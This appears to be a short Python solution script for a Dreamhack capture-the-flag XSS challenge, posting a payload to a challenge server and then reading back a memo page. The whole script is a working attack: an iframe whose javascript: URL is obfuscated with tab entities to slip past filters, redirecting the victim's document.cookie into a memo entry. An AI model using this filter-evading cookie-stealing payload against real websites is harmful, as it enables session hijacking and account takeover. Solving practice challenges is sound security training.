import requests
url = "http://host3.dreamhack.games:21066/"
payload = {"param":"<iframe src='javascr&Tab;ipt:locatio&Tab;n.href=\"/memo?memo=\"+doc&Tab;ument.cookie;'>"}
res = requests.post(url+"flag",data=payload)
print(res.text)

res=requests.get(url+"memo")
print(res.text)
